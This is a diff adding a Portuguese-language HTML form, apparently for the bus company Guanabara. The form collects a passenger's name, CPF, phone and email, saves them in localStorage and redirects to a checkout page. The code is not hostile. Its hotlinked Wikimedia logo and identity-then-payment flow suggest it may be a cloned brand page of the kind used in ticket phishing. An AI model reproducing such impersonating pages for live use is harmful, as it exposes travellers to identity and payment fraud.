@@ -1,1 +1,144 @@
 
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Guanabara | Dados dos Passageiros</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Guanabara_Logo.png/180px-Guanabara_Logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #f5f5f5; color: #333; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        
+        header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 15px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.04); margin-bottom: 20px; }
+        header .container { display: flex; align-items: center; justify-content: space-between; max-width: 1200px; }
+        header .logo img { height: 40px; width: auto; }
+
+        .form-card { background: #fff; border-radius: 16px; padding: 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        h2 { font-size: 24px; color: #1a2b4a; margin-bottom: 8px; }
+        .subtitle { color: #666; margin-bottom: 24px; font-size: 14px; }
+        
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; }
+        input, select { width: 100%; padding: 12px 16px; border: 1.5px solid #e1e3f0; border-radius: 8px; font-size: 14px; transition: border 0.2s; }
+        input:focus, select:focus { outline: none; border-color: #f5a623; }
+
+        .btn-primary { background: #f5a623; color: #fff; border: none; padding: 14px 32px; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .btn-primary:hover { background: #e09515; }
+
+        .error-msg { color: #dc2626; font-size: 14px; margin-bottom: 16px; display: none; }
+
+        @media (max-width: 600px) { .form-card { padding: 20px; } }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo"><a href="/"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Guanabara_Logo.png/180px-Guanabara_Logo.png" alt="Guanabara"></a></div>
+            <div><a href="/tickets" style="text-decoration:none; color:#436ec9; font-weight:600;"><i class="fas fa-arrow-left"></i> Voltar</a></div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="form-card">
+            <h2><i class="fas fa-users" style="color:#f5a623;"></i> Dados dos passageiros</h2>
+            <p class="subtitle">Preencha as informações abaixo para confirmar sua reserva.</p>
+
+            <div id="errorMsg" class="error-msg">Preencha todos os campos obrigatórios!</div>
+
+            <form id="passengerForm">
+                <div class="form-group">
+                    <label for="nomeCompleto">Nome completo do passageiro principal</label>
+                    <input type="text" id="nomeCompleto" placeholder="Ex: João da Silva" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="cpf">CPF do passageiro principal</label>
+                    <input type="text" id="cpf" placeholder="000.000.000-00" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="telefone">Telefone / WhatsApp para contato</label>
+                    <input type="text" id="telefone" placeholder="(DDD) 99999-9999" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">E-mail para envio da passagem</label>
+                    <input type="email" id="email" placeholder="joao@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="temCriancas">Há crianças ou bebês de colo na viagem?</label>
+                    <select id="temCriancas" onchange="toggleCriancas()">
+                        <option value="nao">Não</option>
+                        <option value="sim">Sim</option>
+                    </select>
+                </div>
+
+                <div id="criancasContainer" style="display: none;">
+                    <div class="form-group">
+                        <label for="quantidadeCriancas">Quantas crianças?</label>
+                        <input type="number" id="quantidadeCriancas" value="1" min="1">
+                    </div>
+                    <div class="form-group" id="criancasInfo">
+                        <p style="font-size:13px; color:#666;">
+                            <i class="fas fa-info-circle"></i> 
+                            Crianças de até 5 anos viajam gratuitamente (sem ocupar assento). 
+                            Para crianças maiores, favor comprar uma passagem adicional.
+                        </p>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-primary"><i class="fas fa-arrow-right"></i> Continuar para o pagamento</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function toggleCriancas() {
+            const temCriancas = document.getElementById('temCriancas').value;
+            const container = document.getElementById('criancasContainer');
+            if (temCriancas === 'sim') {
+                container.style.display = 'block';
+            } else {
+                container.style.display = 'none';
+            }
+        }
+
+        document.getElementById('passengerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const nome = document.getElementById('nomeCompleto').value.trim();
+            const cpf = document.getElementById('cpf').value.trim();
+            const telefone = document.getElementById('telefone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const errorDiv = document.getElementById('errorMsg');
+
+            if (!nome || !cpf || !telefone || !email) {
+                errorDiv.style.display = 'block';
+                setTimeout(() => errorDiv.style.display = 'none', 3000);
+                return;
+            }
+
+            const temCriancas = document.getElementById('temCriancas').value;
+            let qtdCriancas = 0;
+            if (temCriancas === 'sim') {
+                qtdCriancas = parseInt(document.getElementById('quantidadeCriancas').value) || 1;
+            }
+
+            // Salva os dados do passageiro no localStorage
+            localStorage.setItem('cliente_nome', nome);
+            localStorage.setItem('cliente_cpf', cpf);
+            localStorage.setItem('cliente_telefone', telefone);
+            localStorage.setItem('cliente_email', email);
+            localStorage.setItem('qtd_criancas', qtdCriancas);
+
+            // Redireciona para o checkout
+            window.location.href = '/checkout';
+        });
+    </script>
+</body>
+</html>
